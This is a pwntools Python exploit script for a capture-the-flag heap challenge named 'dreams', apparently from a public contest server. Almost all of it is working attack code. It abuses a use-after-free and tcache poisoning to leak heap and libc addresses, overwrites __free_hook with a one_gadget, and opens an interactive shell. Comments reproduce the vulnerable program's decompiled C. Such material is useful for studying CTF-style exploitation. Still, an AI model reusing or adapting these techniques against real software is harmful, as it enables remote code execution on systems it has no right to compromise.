#!/usr/bin/env python3
from pwn import *
import time
#binfile = './dreams_patched'

binfile = './dreams'
context.log_level = 'info'
e = ELF(binfile)
#libc = ELF('./libc.so.6')
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

context.binary = binfile
context.terminal = "tmux splitw -h".split(" ")
io = remote('challs.actf.co', 31227)
gs = """
#    break *0x4013e2
#    break *0x4014ff

#    break *0x4014d9
#    break *0x4015e4
#    break *0x40162a
    break *0x4013a4
    continue
"""
#io = gdb.debug(e.path, gdbscript=gs)
#io = process(e.path)

for _ in range(3):
    io.readline().decode()

def select(num: int):
#    for _ in range(4):
#        _ = io.readline()
    io.sendlineafter(b'>', str(num).encode())


# date: next addr
def create(idx: int, date: bytes, dream: bytes): # sleep
    select(1)
    """
        int page = 0;
        char *buf = NULL;
    puts("3 doses of Ambien finally calms you down enough to sleep.");
    puts("Toss and turn all you want, your unconscious never loses its grip.");
    """
#    _ = io.readline()
#    _ = io.readline()
    """
    printf("In which page of your mind do you keep this dream? ");
    scanf("%d", &page);
    getchar();
    """
    io.sendlineafter(b'dream? ', str(idx).encode())
    """
    if (((_MAX_DREAMS <= page) || (page < 0)) || (dreams[page] != 0)) {
        puts("Invalid index!");
        exit(1);
    }
    buf = malloc(0x1c);
    printf("What's the date (mm/dd/yy))? ");
    read(0, buf, 8);
    """
    io.sendafter(b'))? ', date)
    """
    char n = strcspn(buf, '\n');
    buf[n] = 0;
    printf("On %s, what did you dream about? ", buf);
    read(0, buf+8, 0x14);
    """
    io.sendafter(b'about? ', dream)
    """
    dreams[page] = buf;
        """
    print("create ok")

# free
def free(idx: int): # Sell
    select(2)
    """
    int32_t idx;

    puts("You've come to sell your dreams.");
    """
#    io.readline()
    """
    printf("Which one are you trading in? ");
    idx = 0;
    __isoc99_scanf("%d", &idx);
    getchar();
    """
    io.sendlineafter(b'trading in? ', str(idx).encode())
    """
    if ((_MAX_DREAMS <= idx) || (idx < 0)) {
        puts("Out of bounds!");
        exit(1);
    }
    puts("You let it go. Suddenly you feel less burdened... less restrained... freed. At last.");
    free(dreams[idx);
    puts("Your money? Pfft. Get out of here.");
        """
    io.recvuntil(b'here.\n')


# edit
# next_addr
def edit(idx: int, next_addr: bytes, flag=0) -> bytes:
    select(3)
    """
    puts("Due to your HMO plan, you can only consult me to decipher your dream.");
    printf("What dream is giving you trouble? ");
    idx = 0;
    scanf("%d", &idx);
    getchar();
    """
    io.sendlineafter(b'trouble? ', str(idx).encode())
    """
    if (dreams[idx] == 0) {
        puts("Invalid dream!");
        exit(1);
    }
    printf("Hmm... I see. It looks like your dream is telling you that ");
    """
    io.recvuntil(b'you that ')
    """
    puts(dreams[idx]+8);
    """
    ret = io.readline()
    """
    puts("Due to the elusive nature of dreams, you now must dream it on a different day. Sorry, I don't make the rules. Or do I?");
    printf("New date: ");
    read(0, dreams[idx], 8);
    """
    if flag == 1:
        addr_heap_base = u64((ret[:-1]).ljust(8,b"\x00")) - 0x10
        log.info("addr_heap_base = " + hex(addr_heap_base))
        io.sendafter(b'date: ', p64(addr_heap_base + 0x1000))
    else:
        io.sendafter(b'date: ', next_addr)
    return ret

create(idx=4, date=b"11/22/33", dream=b"xxxx")
create(idx=1, date=b"44/55/66", dream=b"yyyy")
free(idx=4)
free(idx=1)
ret = edit(idx=1, next_addr=b"11/22/44", flag=1)
addr_heap_base = u64((ret[:-1]).ljust(8,b"\x00")) - 0x10
#log.info("addr_heap_base = " + hex(addr_heap_base))

create(idx=2, date=b"a", dream=b"a")
create(idx=3, date=p64(0x404010), dream=b"b") # addr_heap_base + 0x1000 == (ret = malloc(0x1c))

ret = edit(idx=0x1ac, next_addr=b"\xa0")  # (0x406000 - 0x4052a0 )/8 = 0x1ac
addr_libc_base = u64(ret[:-1].ljust(8, b"\x00")) - libc.sym["_IO_2_1_stdout_"]
log.info("addr_libc_base = " + hex(addr_libc_base))

# __free_hookをone_gadgetに書き換え
create(idx=10, date=b"a", dream=b"xxxx")
create(idx=11, date=b"a", dream=b"yyyy")
free(idx=10)
free(idx=11)
edit(idx=11, next_addr=p64(addr_heap_base + 0x1020))
create(idx=12, date=b"a", dream=b"a")
create(idx=13, date=p64(addr_libc_base + libc.sym["__free_hook"]), dream=b"b")

remote_libc_onegadgets = [0xe3b2e,0xe3b31,0xe3b34]
local_libc_onegadgets = [0xe3b2e,0xe3b31,0xe3b34]

edit(idx=0x1b0,next_addr=p64(addr_libc_base + remote_libc_onegadgets[1] ))


create(idx=0, date=b"d", dream=b"xxxx")
select(2)
io.sendlineafter(b'trading in? ', b"0")

io.interactive()
